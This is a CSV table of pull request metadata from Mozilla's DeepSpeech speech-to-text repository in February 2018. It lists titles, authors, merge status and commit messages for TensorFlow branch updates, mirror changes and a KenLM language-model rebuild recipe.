,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
3289,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1251,1251,Apt mirrors,,lissyx,1645737,2018-02-15T15:10:25Z,COLLABORATOR,True,3,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4fa424dc8bbfaddc2bdc15dcb9a85810437d734c,"Switch to use Amazon EC2 mirrors

Fixes #1250"
3290,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1249,1249,Update doc for mmap-able model,"Fixes #1248
X-DeepSpeech: NOBUILD",lissyx,1645737,2018-02-15T14:35:43Z,COLLABORATOR,True,18,5,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e4773028ba915ec9481a9ec6a3b3b978c8a1c074,"Update doc for mmap-able model

Fixes #1248"
3291,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1247,1247,Use LDC93S1 small language model,"How to regenerate:
```
 - Get a KenLM build
 - $ (tr -d '[:digit:]|[:punct:]' < LDC93S1.txt | tr '[:upper:]' '[:lower:]'; head -n 500 ../lm/vocab.txt) > vocab.txt
 - $ bin/lmplz --prune 0 0 1 --order 5 --text vocab.txt --arpa vocab.pruned.arpa
 - $ bin/build_binary  -s vocab.pruned.arpa vocab.pruned.lm
 - $ generate_trie ../alphabet.txt vocab.pruned.lm vocab.txt vocab.trie
```

Fixes #1245",lissyx,1645737,2018-02-15T12:57:01Z,COLLABORATOR,True,248534,21,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d7653d749b68a8a487e161f87cbc8c2f0c23eedd,"Use LDC93S1 small language model

How to regenerate:
 - Get a KenLM build
 - $ (tr -d '[:digit:]|[:punct:]' < LDC93S1.txt | tr '[:upper:]' '[:lower:]'; head -n 500 ../lm/vocab.txt) > vocab.txt
 - $ bin/lmplz --prune 0 0 1 --order 5 --text vocab.txt --arpa vocab.pruned.arpa
 - $ bin/build_binary  -s vocab.pruned.arpa vocab.pruned.lm
 - $ generate_trie ../alphabet.txt vocab.pruned.lm vocab.txt vocab.trie

Fixes #1245"
3292,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1235,1235,Support MemmappedFileSystem,Fixes #1231,lissyx,1645737,2018-02-14T17:47:41Z,COLLABORATOR,True,106,41,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c323e8c6726bcd0b7e97474e2dacd30bcf1b78e,"Support MemmappedFileSystem

Fixes #1231"
3293,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1234,1234,Multiple audio native_client benchmark,Fixes #1232,lissyx,1645737,2018-02-14T16:10:52Z,COLLABORATOR,True,133,43,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f54b1f6ad83690b3b321bb6b45a41d0cbf6cbe66,"Multiple audio native_client benchmark

Fixes #1232"
3294,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eac987a09c4fea31f0d5bb54fa1c83ee5a00a6e7,Switch to reference TensorFlow r1.4 branch
3295,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7415adb0bec78bf3dfb8797933ec436c62514dc,"Merge pull request #1221 from lissyx/switch-r1.4-branch

Switch to reference TensorFlow r1.4 branch"
3296,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d378ac7ffa62a960b3bed490d65115aeaa5d456a,"reorder arguments in client.cc, client.py and client.js also update call sites in tc-test-utils.sh"
3297,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f9b3e3807c0c1c339ea263f522e155cf15e4c1f,"Merge pull request #1211 from divyanshj16/reorder_arguments

reorder arguments in client.cc, client.py and client.js."
3298,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bcfd4fd409c3e2c32eb085151f9f87409b549bce,Update for r1.5
3299,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5d3abe8948545be02fd7ee8a47fe83343619461c,"Merge pull request #1226 from lissyx/merge-r1.5

Merge r1.5"
3300,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1230,1230,Update tf master,,lissyx,1645737,2018-02-14T14:58:31Z,COLLABORATOR,True,35,33,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c71120fb319368641b074c80c48bf87ca93f3a16,Merge remote-tracking branch 'upstream/master' into update-tf-master
3301,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1229,1229,Clean up export code and remove some TF 1.0 compat code (Fixes #1228),,reuben,477142,2018-02-14T14:28:36Z,MEMBER,True,22,45,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cee1ec0f17964d6a1138c2bbcfe7a075a34ca220,Remove deprecated session_bundle usage and clean up export code
3302,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1229,1229,Clean up export code and remove some TF 1.0 compat code (Fixes #1228),,reuben,477142,2018-02-14T14:28:36Z,MEMBER,True,22,45,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,983e13f218803bd1c37536073c41c3a435616525,Remove TF 1.0 compatibility hack
3303,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1227,1227,"reorder arguments in client.cc, client.py and client.js also update c…",…all sites in tc-test-utils.sh,lissyx,1645737,2018-02-13T15:20:37Z,COLLABORATOR,False,32,30,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d378ac7ffa62a960b3bed490d65115aeaa5d456a,"reorder arguments in client.cc, client.py and client.js also update call sites in tc-test-utils.sh"
3304,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1226,1226,Merge r1.5,,lissyx,1645737,2018-02-13T10:09:51Z,COLLABORATOR,True,27,32,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bcfd4fd409c3e2c32eb085151f9f87409b549bce,Update for r1.5
3305,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1221,1221,Switch to reference TensorFlow r1.4 branch,,lissyx,1645737,2018-02-09T14:44:40Z,COLLABORATOR,True,21,21,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eac987a09c4fea31f0d5bb54fa1c83ee5a00a6e7,Switch to reference TensorFlow r1.4 branch
3306,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1220,1220,Merge tf master 20180208,,lissyx,1645737,2018-02-09T14:38:22Z,COLLABORATOR,True,31,42,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c9d973a191fb0b15721b0847b18ad9c14905ee61,Create tf-master branch as WIP DeepSpeech against TensorFlow master
3307,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1220,1220,Merge tf master 20180208,,lissyx,1645737,2018-02-09T14:38:22Z,COLLABORATOR,True,31,42,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d28266e3555dfabab9c2da7331dcb45d71557748,Update AOT AllocMode
3308,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1220,1220,Merge tf master 20180208,,lissyx,1645737,2018-02-09T14:38:22Z,COLLABORATOR,True,31,42,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc4bffde6ccbeed98875dd9399df21942e0ce4de,Update TensorFlow pip requirements
3309,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1220,1220,Merge tf master 20180208,,lissyx,1645737,2018-02-09T14:38:22Z,COLLABORATOR,True,31,42,18,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc1f856dadc6fcd9cd2d408eb4ebb70e68449f9e,Update AOT build with TensorFlow master
3310,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1218,1218,Create tf-master branch as WIP DeepSpeech against TensorFlow master,,lissyx,1645737,2018-02-09T11:49:53Z,COLLABORATOR,False,26,32,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2abdcd5a2c6d8a0407eb84e947edf0b43595f634,Create tf-master branch as WIP DeepSpeech against TensorFlow master
3311,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1217,1217,Merge tf master 20180208,,lissyx,1645737,2018-02-08T15:37:18Z,COLLABORATOR,False,25,30,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d2602830f557a9c3eb75a94182e30e593dbba613,Switch to TensorFlow master
3312,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1217,1217,Merge tf master 20180208,,lissyx,1645737,2018-02-08T15:37:18Z,COLLABORATOR,False,25,30,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c5bce48f50c727469e6bb70899fe22561ece8e9,Update AOT AllocMode
3313,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1217,1217,Merge tf master 20180208,,lissyx,1645737,2018-02-08T15:37:18Z,COLLABORATOR,False,25,30,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f194f97cff701f82224e3b03c6e2d7f3ea3ff082,Update TensorFlow pip requirements
3314,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1217,1217,Merge tf master 20180208,,lissyx,1645737,2018-02-08T15:37:18Z,COLLABORATOR,False,25,30,15,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,16436dba276ba82301478d9a5aeffe517f967dc2,Update AOT build with TensorFlow master
3315,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1216,1216,Merge tf master 20180206,,lissyx,1645737,2018-02-08T10:47:05Z,COLLABORATOR,False,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3125844360fe586d5ef2f1c05176872253dc4225,Switch to TensorFlow master
3316,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1216,1216,Merge tf master 20180206,,lissyx,1645737,2018-02-08T10:47:05Z,COLLABORATOR,False,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,75e4c37505608beb23976eaf828ed897f0e13bef,Update AOT AllocMode
3317,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1216,1216,Merge tf master 20180206,,lissyx,1645737,2018-02-08T10:47:05Z,COLLABORATOR,False,23,23,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93a5797864c33e46b0c441340430edecfdacbb98,Update TensorFlow pip requirements
3318,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1211,1211,"reorder arguments in client.cc, client.py and client.js. ","This PR resolves #1032 
This makes audio clip the last argument as requested. 
In client.cc I also changed the index at various location as in c++ CL arguments come as an list not as a dictionary unlike in node.js and python.",divyanshj16,16683472,2018-02-06T18:17:32Z,CONTRIBUTOR,True,32,30,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d378ac7ffa62a960b3bed490d65115aeaa5d456a,"reorder arguments in client.cc, client.py and client.js also update call sites in tc-test-utils.sh"
